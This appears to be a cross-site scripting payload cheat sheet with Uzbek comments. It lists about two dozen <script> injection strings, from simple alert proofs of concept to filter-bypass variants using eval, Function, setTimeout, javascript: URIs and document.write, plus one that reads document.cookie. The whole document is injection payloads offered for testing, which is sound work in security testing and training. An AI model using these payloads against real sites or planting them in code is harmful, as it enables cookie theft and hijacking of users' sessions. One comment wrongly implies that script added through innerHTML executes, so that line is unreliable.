<script>alert(1)</script> 
// Eng basic XSS — JS to‘g‘ridan-to‘g‘ri bajariladi

<script>alert('XSS')</script> 
// Oddiy string bilan test payload

<script>alert(document.domain)</script> 
// Joriy domenni chiqaradi (context tekshirish)

<script>alert(document.cookie)</script> 
// Cookie’larni o‘qishga urinish (agar HttpOnly bo‘lmasa)

<script>confirm(1)</script> 
// confirm dialog — alert filtrlangan bo‘lsa bypass uchun

<script>prompt(1)</script> 
// prompt dialog — input oynasi bilan trigger

<script>console.log(1)</script> 
// Konsolga yozadi (stealth test)

<script>print()</script> 
// Print dialog chaqiradi (kam ishlatiladi)

<script>window.alert(1)</script> 
// alert’ni window orqali chaqirish

<script>top.alert(1)</script> 
// Eng yuqori window contextda ishlatadi

<script>this.alert(1)</script> 
// current context orqali alert chaqirish

<script>self.alert(1)</script> 
// self object orqali alert

<script>alert.call(null,1)</script> 
// Function call orqali alert (bypass texnikasi)

<script>alert.apply(null,[1])</script> 
// apply bilan argument uzatib chaqirish

<script>(function(){alert(1)})()</script> 
// IIFE — darhol ishlaydigan funksiya

<script>(()=>alert(1))()</script> 
// Arrow function orqali execution

<script>setTimeout('alert(1)',0)</script> 
// String eval orqali kechiktirib bajarish

<script>setInterval('alert(1)',1000)</script> 
// Takroriy execution (persistent effekt)

<script>eval('alert(1)')</script> 
// eval orqali stringni JS ga aylantirish

<script>Function('alert(1)')()</script> 
// Function constructor orqali execution

<script>location='javascript:alert(1)'</script> 
// location orqali javascript URI ishlatish

<script>window.location='javascript:alert(1)'</script> 
// window.location orqali redirect + execution

<script>document.write('<script>alert(1)</script>')</script> 
// DOM ga script yozib injection qilish

<script>document.body.innerHTML='<script>alert(1)</script>'</script> 
// Sahifa body ni o‘zgartirib script qo‘shish
